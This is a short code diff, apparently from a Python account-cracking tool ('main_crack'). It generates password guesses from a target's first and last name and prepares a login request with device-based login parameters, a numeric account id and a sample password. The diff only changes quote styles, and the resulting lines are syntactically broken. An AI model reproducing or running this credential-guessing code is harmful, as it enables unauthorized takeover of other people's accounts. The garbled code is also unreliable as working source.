@@ -441,12 +441,12 @@ class main_crack():
                 ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                 with requests.Session() as session:
                     data = ('adid', 'cde46752-9cd1-45ca-9b33-f82698a7a491')
-'format', 'json'
-'device_id', '3b9ab885-b403-481f-ad91-5a88b1273c1d'
-'cpl', 'true'
-'family_device_id', 'e0f270b3-9f3e-4338-ad30-7a2f44fb5147'
-'credentials_type', 'device_based_login_password'
-'error_detail_type', 'button_with_disabled'
+"format', 'json"
+"device_id', '3b9ab885-b403-481f-ad91-5a88b1273c1d"
+"cpl', 'true"
+"family_device_id', 'e0f270b3-9f3e-4338-ad30-7a2f44fb5147"
+"credentials_type', 'device_based_login_password"
+"error_detail_type', 'button_with_disabled"
 'source', 'device_based_login'
 'email', '100049974613980'
 'password', 'md123'
